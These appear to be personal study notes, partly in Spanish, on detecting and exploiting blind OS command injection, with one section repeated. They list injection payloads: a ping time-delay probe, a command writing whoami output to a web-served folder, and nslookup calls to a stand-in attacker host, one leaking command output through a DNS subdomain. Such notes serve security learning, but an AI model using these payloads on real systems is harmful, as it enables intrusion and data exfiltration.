


## Blind OS command injection vulnerabilities
### Detecting blind OS command injection using time delays

`& ping -c 10 127.0.0.1 &` -> si la respuesta tarda 10 segundos entonces es vulnerable

### Exploiting blind OS command injection by redirecting output

Si no nos enseña el output podemos redirigirlo a una parte de la web a la que podamos acceder desde el buscador : 

`& whoami > /var/www/static/whoami.txt &`


### Exploiting blind OS command injection using out-of-band (OAST) techniques

`& nslookup kgji2ohoyw.web-attacker.com &`

### Exploiting blind OS command injection using out-of-band (OAST) techniques

`& nslookup kgji2ohoyw.web-attacker.com &`

y para que se ejecuten comandos y veamos el output:

``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &``
